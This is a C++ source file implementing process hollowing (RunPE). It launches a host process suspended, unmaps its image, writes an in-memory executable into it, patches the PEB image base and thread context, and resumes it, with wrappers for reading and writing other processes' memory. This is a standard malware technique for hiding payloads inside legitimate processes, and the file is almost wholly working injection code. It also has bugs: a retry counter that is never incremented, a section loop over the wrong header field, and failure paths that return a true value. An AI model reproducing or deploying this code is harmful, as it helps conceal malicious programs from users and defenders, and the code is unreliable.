#include <iostream>

#include "Injector.h"

/****************************************************************
 *
 * Runs an application from in-memory byte array
 *
 ***************************************************************/
bool run_pe(byte_array exe, std::wstring hostProcess, std::wstring optionalArguments = L"")
{
	int error_code;
	IMAGE_DOS_HEADER dos_header;
	IMAGE_NT_HEADERS nt_headers;

	// Copy DOS and NT headers
	memcpy(&dos_header, exe.pointer, sizeof(IMAGE_DOS_HEADER));
	memcpy(&nt_headers, exe.pointer + dos_header.e_lfanew, sizeof(IMAGE_NT_HEADERS));

	// Create process
	STARTUPINFO StartupInfo;
	ZeroMemory(&StartupInfo, sizeof(StartupInfo));
	//StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
	//StartupInfo.wShowWindow = SW_SHOWDEFAULT;

	PROCESS_INFORMATION process_info;
	ZeroMemory(&process_info, sizeof(PROCESS_INFORMATION));
	if (!CreateProcess((LPCWSTR)(hostProcess.c_str()), (LPWSTR)(optionalArguments.c_str()), NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &process_info)){
		std::cerr << "Error during started host process, task terminated. Error code: " << GetLastError() << std::endl;
		return false;
	}

	// Free old memory
	auto xNtUnmapViewOfSection = NtUnmapViewOfSection(GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"));
	xNtUnmapViewOfSection(process_info.hProcess, (PVOID)nt_headers.OptionalHeader.ImageBase);

	// Allocating memory
	int alloc_attempts = 0;
	const int max_alloc_attempts = 1000;
	LPVOID alloc_result;

	do {
		alloc_result = VirtualAllocEx(process_info.hProcess, (void*)nt_headers.OptionalHeader.ImageBase, nt_headers.OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	} while (alloc_result == NULL && alloc_attempts < max_alloc_attempts);

	if (alloc_attempts == max_alloc_attempts){
		std::cerr << "Cannot allocate memory, task terminated. Error code: " << GetLastError() << std::endl;
		return false;
	}

	// Injecting headers
	bool write_result = WriteProcessMemory(process_info.hProcess, (void*)nt_headers.OptionalHeader.ImageBase, exe.pointer, nt_headers.OptionalHeader.SizeOfHeaders, NULL);
	if (write_result == false) {
		std::cerr << "Error writing headers. Error code: " << GetLastError() << std::endl;
		return false;
	}

	// Injecting sections
	for (size_t i = 0; i < nt_headers.OptionalHeader.NumberOfRvaAndSizes; i++)
	{
		IMAGE_SECTION_HEADER section_header;
		memcpy(
			&section_header, 
			(exe.pointer + dos_header.e_lfanew + sizeof(IMAGE_NT_HEADERS) + (sizeof(IMAGE_SECTION_HEADER) * i)), 
			sizeof(IMAGE_SECTION_HEADER)
		);

		if (section_header.SizeOfRawData > 0 && section_header.SizeOfRawData < exe.size){
			write_result = WriteProcessMemory(process_info.hProcess, (void*)(nt_headers.OptionalHeader.ImageBase + section_header.VirtualAddress), exe.pointer + section_header.PointerToRawData, section_header.SizeOfRawData, NULL);
			if (write_result == false) {
				std::cerr << "Error writing section " << i + 1 << ". Error code: " << GetLastError() << std::endl;
				return EXIT_FAILURE;
			}
		}
	}

	error_code = GetLastError();
	
	CONTEXT ctx;
	ZeroMemory(&ctx, sizeof(CONTEXT));
	ctx.ContextFlags = CONTEXT_FULL;

	// Get thread's context
 	bool get_ctx_result = GetThreadContext(process_info.hThread, &ctx);
	if (get_ctx_result == false) {
		std::cerr << "Error getting thread's context. Error code: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	// Setting new ImageBase
	DWORD *pebInfo = (DWORD *)ctx.Ebx;
	
	write_result = WriteProcessMemory(process_info.hProcess, &pebInfo[2], &nt_headers.OptionalHeader.ImageBase, sizeof(DWORD), NULL);
	if (write_result == false) {
		std::cerr << "Error writing image base. Error code: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	// EAX contains pointer to the entry point
	ctx.Eax = (DWORD)(nt_headers.OptionalHeader.ImageBase + nt_headers.OptionalHeader.AddressOfEntryPoint);

	// Set thread context and resume program
	bool set_ctx_result = SetThreadContext(process_info.hThread, &ctx);
	if (set_ctx_result == false) {
		std::cerr << "Error setting thread's context. Error code: " << GetLastError() << std::endl;
		return EXIT_FAILURE;
	}

	ResumeThread(process_info.hThread);

	return true;
}

/*****************************************************************
 * 
 * Reads memory of a particular process as a binary array.
 *
 * Wrapper for WinApi's ReadProcessMemory function.
 * 
 *****************************************************************/
byte_array read_proc_memory(HANDLE handle, void* ptr, size_t size){
    char * buf = new char[size];
    SIZE_T bytes_read;
    ReadProcessMemory(handle, ptr, buf, size, &bytes_read);

    int last_error = GetLastError();
    if (bytes_read == 0 || last_error != 0){
        std::cerr << "Failed to read process memory. Bytes read: " << bytes_read << "; WinApi code: " << last_error << std::endl;
		return to_byte_array(NULL, 0);
    }

    return to_byte_array(buf, size);
}

/****************************************************************
 * 
 * Reads memory of a current process as a binary array.
 *
 * Wrapper for WinApi's ReadProcessMemory function.
 * 
 ****************************************************************/
byte_array read_current_proc_memory(void* ptr, size_t size) {
    return read_proc_memory(GetCurrentProcess(), ptr, size);
}

/****************************************************************
 *
 * Re-writes memory of a particular process using binary array provider.
 *
 * Wrapper for WInApi's WriteProcessMemory function
 *
 ****************************************************************/
void write_proc_memory(HANDLE handle, void* ptr, byte_array data){
    SIZE_T bytes_written;
    WriteProcessMemory(handle, ptr, data.pointer, data.size, &bytes_written);

    int last_error = GetLastError();
    if (bytes_written == 0 || last_error != 0){
		std::cerr << "Error! Bytes written: " << bytes_written << "; WinApi code: " << last_error << std::endl;
    }
}

/****************************************************************
 *
 * Re-writes memory of a current process using binary array provider.
 *
 * Wrapper for WinApi's WriteProcessMemory function
 *
 ****************************************************************/
void write_current_proc_memory(void* ptr, byte_array data) {
    write_proc_memory(GetCurrentProcess(), ptr, data);
}